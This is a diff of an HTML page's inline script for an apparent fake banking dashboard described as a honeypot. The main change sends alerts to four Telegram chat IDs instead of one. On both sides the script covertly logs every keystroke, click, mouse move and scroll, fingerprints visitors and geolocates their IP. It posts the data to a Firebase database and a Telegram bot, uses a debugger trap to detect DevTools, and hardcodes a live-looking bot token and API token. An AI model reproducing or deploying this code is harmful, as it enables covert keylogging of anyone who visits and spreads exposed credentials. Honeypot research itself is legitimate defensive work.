@@ -93,216 +93,218 @@
   </div>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.0/fingerprint2.min.js"></script>
-  <script>
-    const firebaseURL = "https://honeypot-715b9-default-rtdb.firebaseio.com/honeypot_sessions.json";
-    const telegramToken = "8389627211:AAGq6tuHxuLKX9m4AQR-ljj77z-GjKrpIig";
-    const chatID = "-4976108659";
+ <script>
+  const firebaseURL = "https://honeypot-715b9-default-rtdb.firebaseio.com/honeypot_sessions.json";
+  const telegramToken = "8389627211:AAGq6tuHxuLKX9m4AQR-ljj77z-GjKrpIig";
 
-    const sessionData = {
-      sessionId: generateSessionId(),
-      ip: "",
-      userAgent: navigator.userAgent,
-      screenResolution: `${screen.width}x${screen.height}`,
-      language: navigator.language,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      mouseMoves: [],
-      clicks: [],
-      keystrokes: [],
-      scrollEvents: [],
-      actions: [],
-      devToolsDetected: false,
-      startTime: Date.now(),
-      lastActivity: Date.now()
-    };
+  const chatIDs = [
+    "268533072",
+    "1919975349",
+    "1063080481",
+    "1089444053"
+  ];
 
-    let notificationsSent = {
-      firstClick: false,
-      firstKey: false,
-      devTools: false,
-      suspiciousActivity: false
-    };
+  const sessionData = {
+    sessionId: generateSessionId(),
+    ip: "",
+    userAgent: navigator.userAgent,
+    screenResolution: `${screen.width}x${screen.height}`,
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    mouseMoves: [],
+    clicks: [],
+    keystrokes: [],
+    scrollEvents: [],
+    actions: [],
+    devToolsDetected: false,
+    startTime: Date.now(),
+    lastActivity: Date.now()
+  };
 
-    function generateSessionId() {
-      return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+  let notificationsSent = {
+    firstClick: false,
+    firstKey: false,
+    devTools: false,
+    suspiciousActivity: false
+  };
+
+  function generateSessionId() {
+    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+  }
+
+  document.addEventListener("click", e => {
+    sessionData.clicks.push({
+      x: e.clientX,
+      y: e.clientY,
+      target: e.target.tagName,
+      timestamp: Date.now()
+    });
+
+    sessionData.lastActivity = Date.now();
+
+    if (!notificationsSent.firstClick) {
+      sendLiveTelegram("🖱️ First mouse click detected on honeypot dashboard");
+      notificationsSent.firstClick = true;
     }
+  });
 
-    document.addEventListener("click", e => {
-      sessionData.clicks.push({
+  document.addEventListener("mousemove", e => {
+    if (Date.now() - sessionData.lastActivity > 100) {
+      sessionData.mouseMoves.push({
         x: e.clientX,
         y: e.clientY,
-        target: e.target.tagName,
         timestamp: Date.now()
       });
-      
-      sessionData.lastActivity = Date.now();
-      
-      if (!notificationsSent.firstClick) {
-        sendLiveTelegram("🖱️ First mouse click detected on honeypot dashboard");
-        notificationsSent.firstClick = true;
+
+      if (sessionData.mouseMoves.length > 100) {
+        sessionData.mouseMoves.shift();
       }
-    });
-
-    document.addEventListener("mousemove", e => {
-
-      if (Date.now() - sessionData.lastActivity > 100) {
-        sessionData.mouseMoves.push({
-          x: e.clientX,
-          y: e.clientY,
-          timestamp: Date.now()
-        });
-        
-
-        if (sessionData.mouseMoves.length > 100) {
-          sessionData.mouseMoves.shift();
-        }
-      }
-      
-      sessionData.lastActivity = Date.now();
-    });
-
-    document.addEventListener("keydown", e => {
-      sessionData.keystrokes.push({
-        key: e.key,
-        code: e.code,
-        timestamp: Date.now()
-      });
-      
-      sessionData.lastActivity = Date.now();
-      
-      if (!notificationsSent.firstKey) {
-        sendLiveTelegram("⌨️ Keyboard activity detected - potential data entry attempt");
-        notificationsSent.firstKey = true;
-      }
-    });
-
-    document.addEventListener("scroll", e => {
-      sessionData.scrollEvents.push({
-        scrollY: window.scrollY,
-        timestamp: Date.now()
-      });
-      
-      sessionData.lastActivity = Date.now();
-    });
-
-    setInterval(() => {
-      const start = performance.now();
-      debugger;
-      const duration = performance.now() - start;
-      
-      if (duration > 100 && !sessionData.devToolsDetected) {
-        sessionData.devToolsDetected = true;
-        
-        if (!notificationsSent.devTools) {
-          sendLiveTelegram("🚨 CRITICAL: DevTools opened! Hacker is inspecting the honeypot");
-          notificationsSent.devTools = true;
-        }
-      }
-    }, 2000);
-
-    function trackAction(actionType) {
-      const action = {
-        type: actionType,
-        timestamp: Date.now()
-      };
-      
-      sessionData.actions.push(action);
-      sessionData.lastActivity = Date.now();
-      
-
-      const criticalActions = ['transfer', 'deposit'];
-      if (criticalActions.includes(actionType)) {
-        sendLiveTelegram(`💰 ALERT: Hacker attempted ${actionType} action on fake banking interface`);
-      }
-      
-      // Simulate loading for realism
-      const button = event.target;
-      button.classList.add('loading');
-      button.disabled = true;
-      
-      setTimeout(() => {
-        button.classList.remove('loading');
-        button.disabled = false;
-        alert(`${actionType.charAt(0).toUpperCase() + actionType.slice(1)} feature is temporarily unavailable. Please try again later.`);
-      }, 2000);
     }
 
-    fetch("https://ipinfo.io/json?token=27824af3b12c98")
-      .then(res => res.json())
-      .then(ipData => {
-        sessionData.ip = ipData.ip;
-        sessionData.location = {
-          city: ipData.city,
-          region: ipData.region,
-          country: ipData.country,
-          org: ipData.org
-        };
-        
+    sessionData.lastActivity = Date.now();
+  });
 
-        sendLiveTelegram(`🎯 NEW HONEYPOT VICTIM DETECTED!\nIP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.country}\nISP: ${ipData.org}`);
-      })
-      .catch(err => console.log("IP lookup failed:", err));
+  document.addEventListener("keydown", e => {
+    sessionData.keystrokes.push({
+      key: e.key,
+      code: e.code,
+      timestamp: Date.now()
+    });
 
-    window.addEventListener("beforeunload", () => {
-      sessionData.endTime = Date.now();
-      sessionData.duration = ((sessionData.endTime - sessionData.startTime) / 1000).toFixed(1);
-      sessionData.totalClicks = sessionData.clicks.length;
-      sessionData.totalKeystrokes = sessionData.keystrokes.length;
-      sessionData.totalMouseMoves = sessionData.mouseMoves.length;
-      sessionData.totalActions = sessionData.actions.length;
-      
+    sessionData.lastActivity = Date.now();
 
-      sendToFirebase(sessionData);
-      
-      const summary = `📊 HONEYPOT SESSION ENDED
+    if (!notificationsSent.firstKey) {
+      sendLiveTelegram("⌨️ Keyboard activity detected - potential data entry attempt");
+      notificationsSent.firstKey = true;
+    }
+  });
+
+  document.addEventListener("scroll", e => {
+    sessionData.scrollEvents.push({
+      scrollY: window.scrollY,
+      timestamp: Date.now()
+    });
+
+    sessionData.lastActivity = Date.now();
+  });
+
+  setInterval(() => {
+    const start = performance.now();
+    debugger;
+    const duration = performance.now() - start;
+
+    if (duration > 100 && !sessionData.devToolsDetected) {
+      sessionData.devToolsDetected = true;
+
+      if (!notificationsSent.devTools) {
+        sendLiveTelegram("🚨 CRITICAL: DevTools opened! Hacker is inspecting the honeypot");
+        notificationsSent.devTools = true;
+      }
+    }
+  }, 2000);
+
+  function trackAction(actionType) {
+    const action = {
+      type: actionType,
+      timestamp: Date.now()
+    };
+
+    sessionData.actions.push(action);
+    sessionData.lastActivity = Date.now();
+
+    const criticalActions = ['transfer', 'deposit'];
+    if (criticalActions.includes(actionType)) {
+      sendLiveTelegram(`💰 ALERT: Hacker attempted ${actionType} action on fake banking interface`);
+    }
+
+    const button = event.target;
+    button.classList.add('loading');
+    button.disabled = true;
+
+    setTimeout(() => {
+      button.classList.remove('loading');
+      button.disabled = false;
+      alert(`${actionType.charAt(0).toUpperCase() + actionType.slice(1)} feature is temporarily unavailable. Please try again later.`);
+    }, 2000);
+  }
+
+  fetch("https://ipinfo.io/json?token=27824af3b12c98")
+    .then(res => res.json())
+    .then(ipData => {
+      sessionData.ip = ipData.ip;
+      sessionData.location = {
+        city: ipData.city,
+        region: ipData.region,
+        country: ipData.country,
+        org: ipData.org
+      };
+
+      sendLiveTelegram(`🎯 NEW HONEYPOT VICTIM DETECTED!\nIP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.country}\nISP: ${ipData.org}`);
+    })
+    .catch(err => console.log("IP lookup failed:", err));
+
+  window.addEventListener("beforeunload", () => {
+    sessionData.endTime = Date.now();
+    sessionData.duration = ((sessionData.endTime - sessionData.startTime) / 1000).toFixed(1);
+    sessionData.totalClicks = sessionData.clicks.length;
+    sessionData.totalKeystrokes = sessionData.keystrokes.length;
+    sessionData.totalMouseMoves = sessionData.mouseMoves.length;
+    sessionData.totalActions = sessionData.actions.length;
+
+    sendToFirebase(sessionData);
+
+    const summary = `📊 HONEYPOT SESSION ENDED
 Duration: ${sessionData.duration}s
 Clicks: ${sessionData.totalClicks}
 Keystrokes: ${sessionData.totalKeystrokes}
 Actions: ${sessionData.totalActions}
 DevTools: ${sessionData.devToolsDetected ? 'YES' : 'NO'}`;
-      
-      sendLiveTelegram(summary);
-    });
 
-    function sendToFirebase(data) {
-      fetch(firebaseURL, {
-        method: "POST",
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-      })
-      .then(response => response.json())
-      .then(() => console.log("✔️ Session data sent to Firebase"))
-      .catch(err => console.log("Firebase error:", err));
-    }
+    sendLiveTelegram(summary);
+  });
 
-    function sendLiveTelegram(msg) {
-      const message = `⚠️ *HONEYPOT ALERT*\n\n${msg}\n\nIP: \`${sessionData.ip || 'pending'}\`\nSession: \`${sessionData.sessionId}\`\nTime: ${new Date().toLocaleString()}`;
+  function sendToFirebase(data) {
+    fetch(firebaseURL, {
+      method: "POST",
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(() => console.log("✔️ Session data sent to Firebase"))
+    .catch(err => console.log("Firebase error:", err));
+  }
 
+  function sendLiveTelegram(msg) {
+    const message = `⚠️ *HONEYPOT ALERT*\n\n${msg}\n\nIP: \`${sessionData.ip || 'pending'}\`\nSession: \`${sessionData.sessionId}\`\nTime: ${new Date().toLocaleString()}`;
+
+    chatIDs.forEach(id => {
       fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: chatID,
+          chat_id: id,
           text: message,
           parse_mode: "Markdown"
         })
       })
-      .then(() => console.log("📬 Telegram alert sent"))
+      .then(() => console.log(`📬 Telegram alert sent → ${id}`))
       .catch(err => console.log("Telegram error:", err));
-    }
+    });
+  }
 
-    setInterval(() => {
-      const timeSinceLastActivity = Date.now() - sessionData.lastActivity;
-      
+  setInterval(() => {
+    const timeSinceLastActivity = Date.now() - sessionData.lastActivity;
 
-      if (timeSinceLastActivity > 30000 && sessionData.clicks.length > 0) {
-        if (!notificationsSent.suspiciousActivity) {
-          sendLiveTelegram("😴 Hacker appears to be studying the interface - no activity for 30+ seconds");
-          notificationsSent.suspiciousActivity = true;
-        }
+    if (timeSinceLastActivity > 30000 && sessionData.clicks.length > 0) {
+      if (!notificationsSent.suspiciousActivity) {
+        sendLiveTelegram("😴 Hacker appears to be studying the interface - no activity for 30+ seconds");
+        notificationsSent.suspiciousActivity = true;
       }
-    }, 10000);
-  </script>
+    }
+  }, 10000);
+</script>
+
 </body>
 </html>
